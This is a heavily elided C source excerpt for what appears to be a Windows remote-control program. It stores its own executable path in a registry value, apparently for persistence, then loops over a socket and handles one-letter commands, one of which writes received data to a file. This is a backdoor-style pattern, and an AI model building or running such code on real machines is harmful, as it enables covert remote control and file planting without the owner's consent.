...
//#define Exe_Path "C:\\Users\\ariel\\Desktop\\EliyahuProjectB\\Debug\\EliyahuProjectB.exe"
...
int __cdecl main(void)
{
    ...
    RegSetKeyValueA(reg1, NULL, "myProject", REG_SZ, Exe_Path, sizeof(Exe_Path));
    RegCloseKey(reg1);
    ///////////
    ...
    do {
        Sleep(300);
        send(ClientSocket, "Chack", strlen("Chack") + 1, 0);
        ...
        if (iResult > 0) {
            ...
            case 'u':
            {
                ...
                DWORD fSize = 0;
                WriteFile(file, buf, atoi(size), &fSize, NULL);
                CloseHandle(file);
                break;
            }
            case 'v':
